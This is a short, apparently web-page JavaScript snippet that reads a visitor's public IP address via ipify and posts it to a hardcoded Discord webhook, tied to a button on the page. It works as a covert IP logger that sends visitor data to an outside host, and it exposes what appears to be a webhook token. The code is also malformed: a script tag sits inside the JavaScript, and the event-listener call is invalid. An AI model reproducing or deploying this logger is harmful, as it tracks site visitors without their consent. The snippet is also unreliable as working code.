
function getIP(json) {
  var request = new XMLHttpRequest(); //making a request for the webhook
      request.open("POST", "https://ptb.discord.com/api/webhooks/1022511640450695249/CZbMASrzVESyxvKbLadMExZa0qndLdsD4HaGCD9B2g6RbD2aQfNQccU29eC6OyPkvjh9");

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "GSA BOT",
        avatar_url: "https://th.bing.com/th/id/R.e79344d7f481a359512615d8bd528be6?rik=PCrbOUjvKJ6fcA&pid=ImgRaw&r=0",
        content: "IP: ||" + json.ip + "||"
        
      }
      
   //just a webhook parameters such as avatar,name,message
var btn = document.getElementById("mybtn")
btn.addEventListener("click", getIP.request.send(JSON.stringify(params)))

    }

    function alertMe(){
        alert("The button has been clicked!");
}

<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>